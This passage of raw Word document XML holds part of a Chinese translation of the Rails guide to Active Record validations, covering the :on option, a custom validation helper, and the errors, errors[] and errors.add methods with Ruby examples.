                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>discount &gt; total_value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E0BD5E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errors.add(:discount, "can't be greater than total value")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="771937B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1D7AA22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04AADB5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9CD9A42"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CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">默认情况下，当你调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时，这些校验总会执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。但</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:create</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:update</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF380B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来控制何时执行校验</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="1C6C1961" w14:textId="77777777" w:rsidTr="00CF380B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0FA3C98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Invoice &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1976AA3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xml:space="preserve">  validate :active_customer, </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF380B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:on</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF380B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF380B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="786DC57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263D683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active_customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CD47EF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errors.add(:customer_id, "is not active") unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>customer.active?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F17BA4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6C51E28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A166AE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你可以创建自己的校验 helpers，并且在多个 models 中复用。例如，在一个管理调查问卷的应用，限定某些字段的取值范围到特定的集合中是很必要的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="77836988" w14:textId="77777777" w:rsidTr="00CF380B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="490F7FB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ActiveRecord::Base.class_eval do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72A2CBF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self.</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF380B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>validates_as_choice</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>(attr_name, n, options={})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A77D00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attr_name, :inclusion</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { { :in</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 1..n }.merge!(options) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1175260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5640302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77476C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你只需要</w:t>
      </w:r>
      <w:r w:rsidRPr="00E95829">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">给 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E95829">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>ActiveRecord::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="00E95829">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类追加定义一个类方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E95829">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">将这些代码放到 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E95829">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="00E95829">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。就可以如下使用它了：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="638D7532" w14:textId="77777777" w:rsidTr="00DB112F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19FE5BA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Movie &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E0E226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validates_as_choice :rating, 5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F4BA1D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44D5FE2B"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8 获取和使用校验错误信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60848CE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作为前面提到过的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>invalid?</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的补充，Rails 还提供了一些方法来配合 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合使用以及用来检查对象的有效性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581DD56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下面是最常用的一些方法。你也可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveModel::Errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文档来查看所有有效的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B91A532"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8.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7B2689"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该方法返回一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveModel::Errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例变量。它包含了该对象校验后的所有错误信息的哈系，以属性为键，以该属性对应错误信息组成的字符串数组为值。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5173A590" w14:textId="77777777" w:rsidTr="009A41A3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2882388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26BF561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:name,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 :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 3</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1557131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4884258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10A1AE6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 = Person.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25AB610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person.valid? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AB646A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person.errors</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DC21B5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 =&gt; {:name =&gt; ["can't be blank", "is too short (minimum is 3 characters)"]}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AA0815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1A8E0C0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 = Person.new(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "John Doe")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="566FDE8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person.valid? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CB7C7A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person.errors # =&gt; []</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5CA3793A"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8.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066E7FD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使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors[]</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>可以查看特定属性的错误信息。它会返回一个包含了该属性对应的所有错误信息组成的字符串数组，每句是一个条错误信息。如果该属性没有相应的错误信息，将返回一个空数组。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4C29A4D9" w14:textId="77777777" w:rsidTr="009A41A3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="582AFF7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049695E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:name,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 :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 3</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200272F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1900A38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488F38C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 = Person.new(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "John Doe")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="398315D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person.valid? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74E9E59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person.errors[:name] # =&gt; []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C19E82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18EC551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 = Person.new(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "JD")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D8A532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person.valid? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EA44D7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person.errors[:name] # =&gt; ["is too short (minimum is 3 characters)"]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="003DA43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57D1390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 = Person.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1085AF1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person.valid? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="739ADCA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person.errors[:name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="170F973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 =&gt; [</w:t>
            </w:r>
            <w:r w:rsidRPr="009A41A3">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>"can't be blank"</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="009A41A3">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>"is too short (minimum is 3 characters)"</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74A600AE"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8.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors.add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7509F9"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通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>add</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法可以手动为特定的属性添加错误信息。你可以使用 </w:t>
      </w:r>
